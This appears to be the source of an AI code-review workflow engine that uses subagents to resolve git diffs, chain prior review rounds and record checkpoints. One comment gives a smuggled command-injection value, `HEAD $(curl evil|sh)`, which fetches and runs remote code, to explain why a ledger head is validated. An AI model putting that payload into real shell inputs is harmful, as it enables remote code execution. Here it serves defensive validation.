const reReviewMemorySection = () => (reReviewMemoryNote ? `## ⚠️ Re-review memory off\n${reReviewMemoryNote}\n\n` : '')
// realm @nick/craft #113: a profile whose dedicated reviewer agent is not registered in this session
// (typically: the craft plugin is not enabled in this project) runs every lens on the generic subagent.
// The review still happens — but without the agent's rubric, and the operator otherwise sees only a
// failed probe. Stated above the verdict, with the fix; recorded on the run record.
/** @type {{ id: string, agent: string, error: string }[]} */
const reviewerAgentUnavailable = []
// The agent-type match and the section text are shared with rust-audit (lib/agent-fallback.mjs).
/** @param {Profile} profile @param {unknown} error */
function noteReviewerAgentMissing(profile, error) {
  if (!reviewerAgentUnavailable.some(x => x.id === profile.id)) reviewerAgentUnavailable.push({ id: profile.id, agent: profile.reviewerAgent, error: String(error || '').slice(0, 160) })
}
// Lens dispatches that came back EMPTY from the reviewer agent and were re-run on the generic
// subagent. On some runtimes that is how an unknown agent type looks; it can also be a transient
// death, so it is not taken as "missing" — but it is said, per profile, rather than staying silent.
/** @type {Record<string, number>} */
const reviewerAgentFallbacks = {}
/** @type {Record<string, string>} */
const reviewerAgentNames = {}           // profile id -> its reviewer agent type, for the report line
// Lens dispatches whose reviewer agent threw a "not found" isAgentTypeMissing does not recognise and the
// generic subagent then answered: the sandbox's wording for an unregistered type is not yet observed (#152),
// so the lens keeps its coverage rather than dying on a guess about the text. Also in the record count.
/** @type {Record<string, { count: number, error: string }>} */
const reviewerAgentNotFound = {}
/** @param {Profile} profile */
function noteReviewerAgentFallback(profile) {
  reviewerAgentFallbacks[profile.id] = (reviewerAgentFallbacks[profile.id] || 0) + 1
  reviewerAgentNames[profile.id] = profile.reviewerAgent
}
/** @param {Profile} profile @param {string} error */
function noteReviewerAgentNotFound(profile, error) {
  const was = reviewerAgentNotFound[profile.id]
  reviewerAgentNotFound[profile.id] = { count: (was?.count || 0) + 1, error }
  reviewerAgentFallbacks[profile.id] = (reviewerAgentFallbacks[profile.id] || 0) + 1
  reviewerAgentNames[profile.id] = profile.reviewerAgent
}
const reviewerAgentSection = () => agentUnavailableSection(
  reviewerAgentUnavailable.map(x => ({ agent: x.agent, what: `every ${x.id} lens`, error: x.error })),
  Object.entries(reviewerAgentFallbacks).filter(([id]) => !reviewerAgentUnavailable.some(x => x.id === id))
    .flatMap(([id, n]) => {
      const agentName = reviewerAgentNames[id] || `${id} reviewer agent`
      const nf = reviewerAgentNotFound[id]
      return [
        { agent: agentName, count: n - (nf?.count || 0), what: 'lens dispatch(es)' },
        ...(nf ? [{ agent: agentName, count: nf.count, what: 'lens dispatch(es)', error: nf.error }] : []),
      ]
    }),
)

// Wraps every report the engine can return. Narrow on purpose: it fires only for a write that was
// ATTEMPTED and did not land, never for telemetry that was never attempted — a marker that shows up
// on healthy runs is a marker people stop reading, which is the symmetric half of the same defect.
/** The extra lenses' account, once the first profile reached its lenses (realm @nick/craft, node #295). */
function extraLensReport() {
  return extraLensOutcome.reached ? extraLensSection({ how: extraLensRequest.how, ran: extraLensOutcome.ran, failed: extraLensOutcome.failed, discovery: extraLensOutcome.discovery, exit: extraLensOutcome.exit, rubric: extraLensOutcome.ran.length ? active[0]?.id ?? '' : '' }) : ''
}

/** The usage-limit stop and how to recover the record it may have cost, above the verdict; '' without a stop. */
function limitStopSection() {
  const advice = limitStopAdvice(limitStop, { version: CRAFT_VERSION, engine: 'review', checkpoints: true })
  return advice ? `## \u26d4 Usage limit reached\n${advice}\n\n` : ''
}

/** @param {string} reportText */
function out(reportText) {
  return `${limitStopSection()}${telemetryLostSection(telemetryLost)}${reReviewMemorySection()}${reviewerAgentSection()}${lightPass ? markVerdictLight(reportText) + lightSection([...lightSkippedLenses], lensPhaseReached, [...lightKeptLenses]) : reportText}${extraLensReport()}${optionalSection()}${surfaceGateSection()}${memorySection(memory)}${priorDecisionsRefusedSection(priorDecisionsIn.refused)}`
}

// ---- the one write path (shared with every other record-filing engine) ----
// lib/run-logging.mjs, imported as run-record.mjs is. The ledger's own survival path, the shard cutter, is
// lib/ledger-shards.mjs, where it is linted and unit-tested; what the final record says about its ledger once
// the shards hold it is lib/ledger-in-shards.mjs (realm @nick/craft, node #245).

/** @type {Schema<CheckpointAnswer>} */
const CHECKPOINT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['runDir'],
  properties: {
    runDir: { type: 'string', description: 'the runDir the script printed; empty string if it failed' },
    error: { type: 'string', description: 'when runDir is empty, the failing line verbatim; when the script printed a craft-log-run WARNING line, that line verbatim; empty otherwise' },
  },
}
let runDir = ''
// The head detect saw, set once detect answers; every checkpoint claims it (see checkpoint below).
let startHead = ''
let checkpointFailed = false
let rejoinArmed = false
// ARMED, not merely "something failed". `checkpointFailed` says a checkpoint died; this says the run
// went on to ASK the logger to rejoin — `!runDir && checkpointFailed`, the only state in which a
// directory can be adopted. Finalize used the coarser flag, so a run whose first checkpoint minted
// its directory and whose third died declared an adoption that never happened: the CLI then dropped
// the `ownDir` shortcut, read a mid-review branch move as "not this run's directory", and left the
// run's own phases unfolded. Sticky, because an adoption is not undone by later checkpoints
// succeeding — once a directory MIGHT be someone else's, it stays might-be for the finalize proof.
// Resolves true only when the slice landed in the directory this run already had and asked for.
/** @param {string} phaseTitle @param {Record<string, unknown>} payloadIn @param {string} group @returns {Promise<boolean>} */
async function checkpoint(phaseTitle, payloadIn, group) {
  // kind/name are what the checkpoint DIRECTORY is named after, and `recover` parses them back out of
  // that name to rebuild a dead run's identity. A payload without them produced a real
  // `…Z-unknown-unknown` directory on the first live run — recoverable, but recovered as a run of
  // nothing. They belong on every slice, not just the final record.
  // craftVersion rides on every slice: it is what the checkpoint's own logger lookup derives its
  // version from, and a slice that cannot say which build wrote it is a slice `recover` cannot place.
  // workflowEngineRevision: THIS engine's revision, the side that computes the fingerprints — what a
  // later round decides their basis by (realm @nick/craft #111). Last, so no payload key shadows it.
  // startHead: the head detect saw before scout, gate or any lens read the tree. The logger stamps the slice's
  // own `head` from git, minutes later; it keys a push verdict to that head only when the two agree
  // (lib/craft-log-run.mjs, reviewedTree), so a fix committed in between is never taken as reviewed.
  const payload = { kind: 'workflow', name: 'review', craftVersion: CRAFT_VERSION, ...payloadIn, startHead, workflowEngineRevision: ENGINE_REVISION }
  // ragent does NOT catch a budget-exceeded throw (see its comment), and agent() throws for harness
  // reasons too — so a rejection, not just a null, is a real outcome here. It has to land in the same
  // place as every other failed write: the report. Letting it propagate would abort the whole review
  // over a bookkeeping write, which is exactly what this whole path exists to prevent.
  const asked = runDir
  const armRejoin = !runDir && checkpointFailed
  if (armRejoin) rejoinArmed = true
  const { answer: res, threw } = splitThrew(await ragentQuietly(
    checkpointPrompt({ payload, craftRoot: craftRootArg, repo: repoArg, phase: phaseTitle, dir: runDir, rejoin: armRejoin }),
    { label: `checkpoint:${phaseTitle}`, phase: group, schema: CHECKPOINT_SCHEMA, model: 'haiku', effort: 'low' },
  ))
  if (res?.runDir) return tookRunDir(phaseTitle, asked, res.runDir)
  // Remember it: with no runDir to thread, every later checkpoint would mint a directory of its
  // own and this run would fragment into orphan partials that `recover` promotes as unrelated
  // half-runs. `--rejoin` lets the script re-enter the directory this run already has. It is opt-in
  // for a reason — asking for it unconditionally would make a SECOND, concurrent review adopt this
  // one's directory, and concurrent reviews on one machine are ordinary.
  checkpointFailed = true
  noteTelemetryLoss(`phase checkpoint '${phaseTitle}'`, threw || res?.error || 'the logger agent returned no runDir')
  return false
}
// The directory a landed checkpoint returned, taken as the run's; true when it is the one the run asked for.
/** @param {string} phaseTitle @param {string} asked @param {string} returned @returns {boolean} */
function tookRunDir(phaseTitle, asked, returned) {
  // A refused `--dir` does not fail the checkpoint: the script MINTS a fresh directory, prints a
  // WARNING on stderr and returns a perfectly valid runDir on stdout. Taking it silently strands
  // every slice written into the directory we asked for — finalize folds only the new one, its
  // `kept` warning cannot fire (the old directory was never its target), and the report calls the
  // run clean. The engine can see this without trusting the model to relay stderr: we know which
  // directory we asked for, so a different one coming back IS the refusal.
  if (asked && returned !== asked) {
    noteTelemetryLoss(`phase checkpoint '${phaseTitle}'`, `the logger minted ${returned} instead of the run's own ${asked} — earlier phase slices there will not be folded`)
  }
  runDir = returned
  return !!asked && returned === asked
}

// Persisting the record is deterministic work, and it is now done by lib/craft-log-run.mjs. The model
// is left in the loop only because the sandbox cannot reach a filesystem at all — its entire job is a
// quoted heredoc into the script. It no longer computes ts/project/commit/dirty, chooses the filename,
// hand-appends the index or hand-verifies the readback; that recipe is what once persisted a completed
// review as `dimensions: [], verification: null`. Fewer decisions in the prompt is the whole fix.
// The write itself is the one every engine binds (lib/run-logging.mjs, makeRunLogger); what is
// review's own is bound here.
const logRun = makeRunLogger({
  // ragent underneath `quietly`, so the retry-once behaviour still applies to the record write.
  call: ragentQuietly,
  phase: 'Synthesize',
  // `finalize`, not `write`: this is the one engine that checkpoints, so the script folds this run's
  // phase slices into the record it writes. Read at each call — `runDir` and `rejoinArmed` move as
  // the checkpoints run.
  target: () => ({ craftRoot: craftRootArg, repo: repoArg, command: 'finalize', dir: runDir, rejoin: rejoinArmed }),
  // Every review record — the early exits too, not only reviewRecord() — says which engine computed its
  // fingerprints: a later round decides their basis by this (realm @nick/craft #111). Last, so no
  // caller's field shadows it.
  prepare: recordIn => ({ ...recordIn, workflowEngineRevision: ENGINE_REVISION }),
  // Into the same telemetryLost list the checkpoints and the prior-round read note into, but through
  // the shared note: a record that landed with its run directory refused is logged as landed, never
  // as lost (realm @nick/craft #39). makeRunLogger always hands it a non-empty reason, so the line kept
  // for the report is the one noteTelemetryLoss would keep.
  noteLoss: telemetryLossNoter(telemetryLost, log),
})

/** @param {Finding} f */
function key(f) {
  return `${(f['file'] || '').toLowerCase()}:${f['line'] || 0}:${(f['title'] || '').toLowerCase().replace(/\s+/g, ' ').trim()}`
}


// ================= Detect base + languages =================
phase('Scout')
// An absolute `path` with no `repo` to decide it against: refuse BEFORE the first agent is
// dispatched. Zero cost, and the caller is told the two spellings that are unambiguous — against a
// run that guesses, which costs a full fan-out and then reports a scope nobody asked for.
async function ambiguousPathExit() {
  const msg = `path=${ambiguousPath} is an absolute path and no \`repo\` was given, so it is ambiguous: it could name the REPOSITORY to review (pass it as \`repo\`) or a directory INSIDE the repository to narrow to (pass it relative to the repo root). Nothing ran — re-dispatch with one of those two spellings.`
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null, memory: memoryRecord(memory),
    languages: [], verdict: 'INCOMPLETE (ambiguous path)', findings: summarizeFindings([]), dimensions: [], verification: null,
    // The CLASS, not this run's path — `notRun` is ranked by exact string (see `scopeNotRun`).
    // The path itself is in the verdict prose below, where nothing ranks it.
    uncoveredFiles: [], notRun: ['an absolute `path` with no `repo` — ambiguous scope, nothing ran', ...extraLensesNotRun('the scope path is ambiguous')], ...depthRecordFields(), outputTokens: budget.spent(),
  })
  return out([`## Verdict`, `⚠️ INCOMPLETE — ${msg}`].join('\n'))
}
async function detectDiedExit() {
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null, memory: memoryRecord(memory),
    languages: [], verdict: 'INCOMPLETE (detect died)', findings: summarizeFindings([]), dimensions: [], verification: null, notRun: ['base/changed-files detection', ...scopeNotRun, ...extraLensesNotRun('change detection died')], ...depthRecordFields(), outputTokens: budget.spent(),
  })
  return out([`## Verdict`, `⚠️ INCOMPLETE — the base-resolution agent died twice (API error); nothing was reviewed. Re-run the review.`].join('\n') + scopeSection())
}
/** @returns {Promise<{ exit: string, detected: null } | { exit: null, detected: DetectAnswer }>} */
async function detectChanges() {
  if (ambiguousPath) return { exit: await ambiguousPathExit(), detected: null }
  const detectorAnswer = await ragent(
    `You are resolving the review base and the changed files. Use shell + read only — do NOT review.${pathArg ? `\n\nSCOPE: consider ONLY files under ${shq(pathArg)}; pass \`-- ${shq(pathArg)}\` to the git commands below.` : ''}
1. Resolve the diff base. ${baseArg
    ? `Use \`${baseArg}\`.`
    : 'Try in order until one resolves: `git merge-base HEAD origin/main`, `git merge-base HEAD main`, `HEAD~1`. If the tree has uncommitted changes, target those.'}
2. List the changed file paths: \`git diff --name-only <base>...HEAD\`${pathArg ? ` -- ${shq(pathArg)}` : ''} (and include uncommitted changes from \`git status --porcelain\` if the tree is dirty).
3. Capture the VERBATIM change description as \`spec\` — the authors' own written claims/invariants, checked against code later. If the current branch has an OPEN PR, run \`gh pr view --json body,title\` and use its title + body. Otherwise use the commit messages on the diff range: \`git log <base>..HEAD --format=%B\`. Do not summarize or paraphrase — copy the text as-is. Truncate to ~4000 chars. Empty string if there is no PR and no commit body (e.g. only uncommitted changes). If \`gh\` is missing/unauthenticated, fall through to the commit messages.
4. Capture \`branch\` = \`git rev-parse --abbrev-ref HEAD\` (empty string if detached) and \`head\` = \`git rev-parse --short HEAD\` (empty string if not a git repo). The logger reads both off the working copy with git when a record is written, and its values win; \`head\` also tells it which commit the run started on, so an empty \`head\` files no verdict for that commit.
5. Set \`baseIsHead\`: true when \`git rev-parse '<base>^{commit}'\` and \`git rev-parse HEAD\` print the same sha, else false. This one is NOT a fallback: the run reads it to tell a review launched on the trunk itself from any other empty diff.
Return baseRef (the ref you resolved, empty string if none), files (the changed paths), spec (the verbatim description), branch, head, and baseIsHead.`,
    { label: 'detect', schema: DETECT_SCHEMA, model: 'haiku', effort: 'low' },
  )
  // If base resolution died even after the retry, say so loudly — falling through would
  // produce a misleading "Approve — no supported language" on an empty file list.
  if (!detectorAnswer) return { exit: await detectDiedExit(), detected: null }
  return { exit: null, detected: detectorAnswer }
}
const detection = await detectChanges()
if (detection.exit !== null) return detection.exit
const detected = detection.detected
/** What the detect agent resolved, normalised: the base, the changed files, the spec and the run's identity. @param {DetectAnswer} detectedIn */
function detectedChange(detectedIn) {
  const detectedBase = detectedIn.baseRef ?? baseArg
  // DECODED HERE, at the source, before anything asks what a file is. The list comes back as git
  // printed it, and git C-quotes any name holding a space or a non-ASCII character — so the string
  // ends in `"`, `detect` sees no `.rs` suffix, the shared-suffix test sees no `.lock`, and the file
  // belongs to no profile and enters no slice. Decoding it further downstream, at the point the
  // pathspec is rendered, was the first attempt and it could never fire: the name had already been
  // filtered out. Normalising once here also corrects which profiles are considered active and which
  // files are reported as covered by none.
  const detectedFiles = (Array.isArray(detectedIn.files) ? detectedIn.files : []).map(decodeGitPath)
  // The authors' OWN written spec (PR body/title or commit messages) — checked claim-by-claim
  // against the code by the intent lens. The one-line inferred `intent` is not enough: precise
  // claims ("never fails on X", "the only way to Y", "idempotent no-op") live in the full body.
  const detectedSpec = (typeof detectedIn.spec === 'string' ? detectedIn.spec : '').slice(0, 4000)
  // The detect agent runs `git rev-parse --abbrev-ref HEAD`, which prints the literal string "HEAD" on
  // a DETACHED HEAD — a non-branch. Route it through the same rule gitIdentity applies (branchFromAbbrevRef,
  // from lib/run-record.mjs) so a detached run resolves to '' BEFORE this value becomes both
  // the record branch (below) and the prior-round `--branch` flag: a non-empty "HEAD" would pass the
  // no-branch guard and wrongly chain unrelated detached contexts to each other (realm @nick/craft #104).
  const detectedBranch = branchFromAbbrevRef((typeof detectedIn.branch === 'string' ? detectedIn.branch : '').trim())
  const detectedHead = (typeof detectedIn.head === 'string' ? detectedIn.head : '').trim()
  return { baseRef: detectedBase, changedFiles: detectedFiles, spec: detectedSpec, branch: detectedBranch, head: detectedHead }
}
const { baseRef, changedFiles, spec, branch, head } = detectedChange(detected)
startHead = head

// Round detection: find the newest prior `review` run for this branch, and accept it as the prior
// round ONLY if its head is an ANCESTOR of the current HEAD (a rebase/force-push makes a stale run
// non-ancestor → treat as a fresh first review). `fresh` skips the whole mechanism.
//
// The gate is `!freshArg` ALONE — it used to also require `branch && head`, both of which come from
// the `detect` agent's answer above. That made the whole re-review memory conditional on a model
// filling two fields: a `detect` agent that died or answered without them skipped the read entirely
// and the run reported as a first review, indistinguishable from a genuine one. The script reads the
// branch off git itself now (`prior-round` prefers git over `--branch`), so the flag below is the
// fallback, not the key.
//
// It is NOT `!freshArg` alone, and the second clause is a decision rather than a guard restored.
// The chain is keyed on (project, branch), and `rust-audit` fans out one nested `review` per crate
// through `parallel`: concurrent siblings share both keys. Unconditional entry put them all on one
// chain — each reading whichever sibling filed last as its own previous round and inheriting another
// crate's ledger. A per-crate child is one slice of its parent's single pass, not a round of its
// own, so it does not enter the chain: not as a reader (here) and not as a candidate
// (`selectPriorRounds` skips `nested` rows). The run that has a history is the top-level one.
// Unlike the condition this replaces, the skip is announced — a silent skip was that defect.
// The prior round as the loader read it, hardened, with the reason it was not chained when it was not.
async function loadPriorRound() {
  /** @type {PriorRound | null} */
  let loadedPriorRound = null
  // The prior-round lookup's non-found reason, held here because `priorRound` is nulled on a miss below.
  // It is the reason the run did NOT chain to a prior round; null means it DID (reReviewMemory reads null
  // as "chained"). fresh and nested never look up a prior round, so they are their own reasons — not
  // "chained", and not the detached-HEAD footgun either (realm @nick/craft #104).
  /** @type {string | null} */
  let loadedPriorReason = freshArg ? 'fresh' : viaArg ? 'nested' : null
  if (!freshArg && viaArg) {
    log(`Nested run (via ${viaArg}) — the round chain is the top-level run's: not read, and this run's row is not a candidate round for anyone (its siblings in the fan-out share this project and branch)`)
  }
  if (!freshArg && !viaArg) ({ priorRound: loadedPriorRound, priorReason: loadedPriorReason } = await readPriorRound(loadedPriorReason))
  announcePriorRound(loadedPriorRound)
  return { priorRound: loadedPriorRound, priorReason: loadedPriorReason }
}
/** @param {string | null} priorReasonIn @returns {Promise<{ priorRound: PriorRound | null, priorReason: string | null }>} */
async function readPriorRound(priorReasonIn) {
  // The loader's throw, held apart from its answer so `priorRound` is only ever an answer or null.
  let priorReadThrew = ''
  /** @type {PriorRound | null} */
  let readRound = await ragentQuietly(
    `You are the craft prior-round loader. This is mechanical IO — you DECIDE nothing: selecting the round, checking ancestry and reading the record are all done by the script.

Run exactly this:

\`\`\`
${loggerPreludeNow()}cd ${shq(repoArg || '.')} && node ${LOGGER_PATH} prior-round --branch ${shq(branch)} \${CLAUDE_CODE_SESSION_ID:+--session "$CLAUDE_CODE_SESSION_ID"} --project "$PWD"
\`\`\`

It prints ONE line of JSON and always exits 0. Return that object VERBATIM — copy the \`ledger\` array byte for byte, do not summarize, re-key, truncate or "clean up" any entry. It prints \`ledgerCount\` alongside \`ledger\` — copy that number EXACTLY as printed; never recount, never adjust it to the array you are returning. Copy \`sameFpBasis\` exactly as printed too — it decides whether this round may compare fingerprints with the last one, and a dropped or flipped value loses the loop's memory. If the printed object has no \`sameFpBasis\`, leave it out; never invent one. The same holds for \`fpBasisKnown\`, \`priorFpRevisions\` (copy that array exactly) and \`priorFpRevisionsCheck\`. If the command prints nothing or cannot run, return {found:false, round:0, head:"", ledger:[], ledgerCount:0, priorFindings:0, journalSourced:false, sameFpBasis:false, fpBasisKnown:false, reason:"loader-did-not-run"}.`,
    { label: 'prior-round', schema: PRIOR_ROUND_SCHEMA, model: 'haiku', effort: 'low', phase: 'Scout' },
  ).then(res => { const { answer, threw } = splitThrew(res); priorReadThrew = threw; return answer })
  // Every rejection has a reason and the reason is LOGGED. Silence here is the exact defect this
  // command replaced: the first re-review of a branch whose rows predate the absolute-path key
  // restarts from a blank ledger, and that must be visible rather than inferred from thin results.
  if (!readRound?.['found']) {
    priorReasonIn = rejectedPriorReason(readRound, priorReadThrew)
    readRound = null
  }
  // Harden the model-authored ledger `head` at the LOAD boundary before it ever reaches a shell
  // command (it is interpolated into the carry/adjudicate `git diff <head>...HEAD`). If it is not a
  // safe commit-ish (a crafted `HEAD $(curl evil|sh)` from a tampered ledger), fall back to the
  // already-resolved base ref rather than nulling priorRound — re-review stays ON, the fix-range diff
  // just widens to base...HEAD. The use sites additionally shq()/flattenField() it (defense in depth).
  if (readRound && !isCommitish(readRound['head'])) {
    log(`⚠️ prior-round head ${JSON.stringify(readRound['head'])} is not a safe commit-ish — falling back to the base ref for the fix-range diff`)
    readRound['head'] = baseRef
  }
  return { priorRound: readRound, priorReason: priorReasonIn }
}
// Why there is no prior round, logged; a read that failed (rather than found nothing) is a lost record.
/** @param {PriorRound | null} priorRoundIn @param {string} priorReadThrew */
function rejectedPriorReason(priorRoundIn, priorReadThrew) {
  // Capture WHY there is no prior round BEFORE `priorRound` is nulled below: the re-review memory
  // outcome (chained? and the detached-HEAD note) is derived from it (realm @nick/craft #104).
  const rejectedReason = priorRoundIn?.['reason'] || 'no-prior-round'
  if (priorRoundIn?.['reason']) log(`No prior round: ${priorRoundIn['reason']}`)
  notePriorReadFailure(priorRoundIn, priorReadThrew)
  return rejectedReason
}
/** @param {PriorRound | null} priorRoundIn @param {string} priorReadThrew */
function notePriorReadFailure(priorRoundIn, priorReadThrew) {
  // A read that FAILED is the same lost-record class as a write that failed, and its silence is
  // worse: the run degrades into a first review (thisRound resets to 1, the whole adjudicate/carry
  // track is skipped) and the report cannot be told apart from a genuine first pass.
  // Narrow on purpose: the loader tells "there IS no prior round" (no-candidate-rows, no-branch, an
  // ancestry rejection after a rebase — health, and the common case: every first review) apart from
  // "the read could not run". Only the latter is a lost record; marking the former would fire the
  // marker on every first review, which is precisely how a marker stops being read.
  const READ_FAILURES = ['loader-did-not-run', 'git-unavailable']
  const readFailed = !priorRoundIn || !!priorReadThrew || READ_FAILURES.some(r => String(/** @type {PriorRound} */ (priorRoundIn)['reason'] || '').startsWith(r))
  if (readFailed) {
    noteTelemetryLoss('the prior-round ledger', priorReadThrew || priorRoundIn?.['reason'] || 'the loader agent returned no result')
  }
}
/** @param {PriorRound | null} priorRoundIn */
function announcePriorRound(priorRoundIn) {
  // Transport integrity: assert the ledger we received is the ledger the script printed.
  if (priorRoundIn && ledgerTruncated(priorRoundIn)) {
    log(`⚠️ prior-round ledger arrived TRUNCATED: the loader printed ${priorRoundIn['ledgerCount']} entr(ies), ${priorRoundIn['ledger']?.length || 0} survived transport — treating the round as degraded and forcing a full re-scan.`)
  }
  if (priorRoundIn) log(`Re-review: prior round ${priorRoundIn['round']} @ ${flattenField(priorRoundIn['head'])} · ${priorRoundIn['ledger']?.length || 0} ledger finding(s)`)
  else log(freshArg ? 'Fresh review (—fresh): prior round ignored' : 'First review for this branch (no prior round)')
}
const { priorRound, priorReason } = await loadPriorRound()

// realm @nick/craft #104: whether re-review memory engaged, and the note for the one case that fails
// silently — a detached HEAD, where the lookup returns 'no-branch' and the run degrades to round 1
// with no chaining. Recorded on the run record (reReview) and, when the note is set, shown at the top
// of the user-facing report via reReviewMemorySection(). Derived once here, near the round it explains.
const reReview = reReviewMemory(priorReason)
function applyReReviewNote() {
  if (reReview.note) {
    reReviewMemoryNote = reReview.note
    log(`⚠️ ${reReview.note}`)
  }
}
applyReReviewNote()

// Re-review coverage guards (see ledgerDegraded / shouldFullRescan). thisRound is the round number we
// are about to record; reused for the record below.
//
// CONCURRENCY ASSUMPTION, STATED RATHER THAN LOCKED. Deriving the round is a read-modify-append on the
// shared per-(project,branch) store with no lock: this run read the latest prior round above and will
// append round `thisRound`. It assumes no OTHER non-nested review of this same (project,branch) is
// advancing the chain at the same time. The engine's own only source of same-branch concurrency —
// `rust-audit`'s per-crate fan-out — is already excluded from the chain on both ends (`nested` rows are
// skipped as candidates in selectPriorRounds and as readers above), so what remains is an EXTERNAL act:
// two top-level reviews of one branch dispatched at once. That is outside the engine's serialization
// contract, and deliberately not guarded here — a per-branch lock is disproportionate to the cost. If
// it does happen, both compute the same `thisRound` and both append; selection then takes the later ts
// and the loser's ledger is orphaned. Live findings recover on the next full rescan; the one casualty
// with no recovery path is the loser's monotonic tombstone set. This is an accepted, bounded loss, not
// corruption — recorded here so the next reader meets the assumption before the store, not after.
const thisRound = roundNumber()
function roundNumber() {
  return priorRound ? (priorRound['round'] || 1) + 1 : 1
}
// The prior round's finding fingerprints are comparable to this round's
// only when both were fingerprinted under the same basis (FP_BASIS_SINCE in lib/run-record.mjs — a
// separate question from the engine revision, so a telemetry-only bump keeps it; realm @nick/craft
// #108). The ENGINE decides it (below) from the raw revisions the loader hands over; the loader's own
// `sameFpBasis` is only the fallback for a loader older than that field. Only an explicit "same basis"
// is comparable; anything that is not established fails closed. When it is a known different basis —
// the first re-review after a fingerprint-basis change — the tombstone recidivism check is skipped for
// that one transition rather than comparing hashes across incompatible bases and missing a regression
// silently (see the recidivism block and the tombstone assembly; the memory rebuilds from this round on).
// The basis verdict is decided HERE, by the engine that computes the fingerprints, with the table
// of lib/run-record.mjs (realm @nick/craft #111): from the raw revisions the loader hands over. A loader that
// predates that field still sends its own verdict, and that is used then.
// The relayed array crosses a model; the loader prints the same list as a string next to it
// (`priorFpRevisionsCheck`). The engine trusts the array only when the two still match — an invented []
// or a truncated or swapped list does not — and otherwise fails closed, reporting a transport loss
// (priorBasisMismatch). When the array arrived intact, THIS engine's table decides, whatever the
// logger's own table said (realm @nick/craft #111).
const relayedVerdict = relayedVerdictOf()
function relayedVerdictOf() {
  return priorRound && typeof priorRound['sameFpBasis'] === 'boolean'
    ? { sameFpBasis: priorRound['sameFpBasis'], fpBasisKnown: priorRound['fpBasisKnown'] } : null
}
const relayedRevisions = relayedRevisionsOf()
function relayedRevisionsOf() {
  return priorRound && Array.isArray(priorRound['priorFpRevisions']) ? priorRound['priorFpRevisions'] : null
}
const relayedCheck = relayedCheckOf()
function relayedCheckOf() {
  return priorRound && typeof priorRound['priorFpRevisionsCheck'] === 'string' ? priorRound['priorFpRevisionsCheck'] : null
}
// A new loader prints BOTH fields on every path; an older one prints neither. So: an array whose check
// no longer matches, or a check with no array, is a transport loss. An EMPTY array whose '' check the
// relay dropped is not — that is an honest "nothing established", and the absent check reads as ''.
const priorBasisMismatch = basisMismatchOf()
function basisMismatchOf() {
  return !!priorRound && (relayedRevisions
    ? (relayedCheck ?? (relayedRevisions.length ? null : '')) !== relayedRevisions.join(',')
    : relayedCheck !== null)
}
const engineFromRevisions = engineBasisOf()
function engineBasisOf() {
  return !priorBasisMismatch && relayedRevisions ? basisVerdictFromRevisions(relayedRevisions) : null
}
// Where the engine's verdict departs from the logger's own, the engine wins (it computes the
// fingerprints) — said in the log and on the record, so skew between the two tables can be counted.
const basisOverridesLogger = basisOverridesLoggerOf()
function basisOverridesLoggerOf() {
  return !!(engineFromRevisions && relayedVerdict
    && (engineFromRevisions.sameFpBasis !== relayedVerdict.sameFpBasis || engineFromRevisions.fpBasisKnown !== relayedVerdict.fpBasisKnown))
}
function logBasisRelay() {
  if (priorBasisMismatch) log(`⚠️ prior-round revisions arrived altered (list ${JSON.stringify(relayedRevisions)}, check ${JSON.stringify(relayedCheck)}) — the fingerprint basis is treated as unknown`)
  if (basisOverridesLogger) log(`Re-review: this engine's fingerprint-basis verdict on revisions ${JSON.stringify(relayedRevisions)} (${JSON.stringify(engineFromRevisions)}) overrides the logger's (${JSON.stringify(relayedVerdict)}) — their tables differ`)
}
logBasisRelay()
const priorBasis = priorBasisOf()
function priorBasisOf() {
  return !priorRound ? null
    : priorBasisMismatch ? { sameFpBasis: false, fpBasisKnown: false }
      : engineFromRevisions || relayedVerdict
}
const priorFpComparable = fpComparableOf()
function fpComparableOf() {
  return priorBasis ? priorBasis.sameFpBasis === true : false
}
// What the basis verdict actually was, and how many carried tombstones it cost — on the run record, so
// whether a revision bump kept every loop's memory (realm @nick/craft #108) is measurable from the
// store rather than only readable in one run's log. Set where the tombstones are dropped.
// 'unknown' is a verdict of its own: the loader answered "not comparable" without establishing that
// the prior's basis is a KNOWN different one (a recovered round whose checkpoints do not attest to one
// known basis, an unreadable round, a record it cannot place, or an answer whose fpBasisKnown was not
// carried) — not a basis change, and reported as lost memory
// (realm @nick/craft #110). Only an explicit fpBasisKnown: true makes "not comparable" a basis change.
const priorBasisVerdict = basisVerdictOf()
function basisVerdictOf() {
  return !priorBasis ? 'absent'
    : (priorBasis.sameFpBasis === false && priorBasis.fpBasisKnown !== true) ? 'unknown'
      : priorBasis.sameFpBasis
}
let tombstonesDroppedForBasis = 0
const priorLedgerDegraded = ledgerDegraded(priorRound)
function warnLedgerDegraded() {
  if (priorLedgerDegraded) {
    log(`⚠️ Re-review DEGRADED: prior round ${/** @type {PriorRound} */ (priorRound)['round']} reported ${/** @type {PriorRound} */ (priorRound)['priorFindings']} finding(s) but persisted NO ledger — the adjudicate track has nothing to carry or re-verify. Forcing a full base...HEAD re-scan this round; if results still look thin, re-run with {fresh:true}.`)
  }
}
warnLedgerDegraded()
// Distinct from `priorLedgerDegraded`: the ledger itself is fine here, but a journal-reconstructed
// round's `head` is the commit the DEAD run stalled on, which the operator typically re-runs against
// BEFORE making any fix — so it can equal the current HEAD and a delta scan would review nothing.
const priorRoundJournalSourced = journalSourcedOf()
function journalSourcedOf() {
  return Boolean(priorRound?.['journalSourced'])
}
function warnJournalSourced() {
  if (priorRoundJournalSourced) {
    log(`⚠️ Re-review round reconstructed from what a STOPPED run left behind (its journal, or its surviving phase checkpoints): prior round ${/** @type {PriorRound} */ (priorRound)['round']}'s head ${flattenField(/** @type {PriorRound} */ (priorRound)['head'])} is where that run stopped, not a completed round's head — it may equal this run's HEAD if no fix landed yet. Forcing a full base...HEAD re-scan this round rather than risk an empty head...HEAD diff.`)
  }
}
warnJournalSourced()
const fullRescan = shouldFullRescan({ priorRound, thisRound, fullEvery, degraded: priorLedgerDegraded, journalSourced: priorRoundJournalSourced })
// On a re-review the lenses look only at the fix commits (prevHead...HEAD) — cheap, and it catches
// regressions the fixes introduced. But every `fullEvery`-th round (and whenever the prior ledger is
// degraded, or the prior round came from a stalled run's journal) we widen back to the FULL
// base...HEAD diff so a defect an earlier round missed in code it never touched is re-discovered.
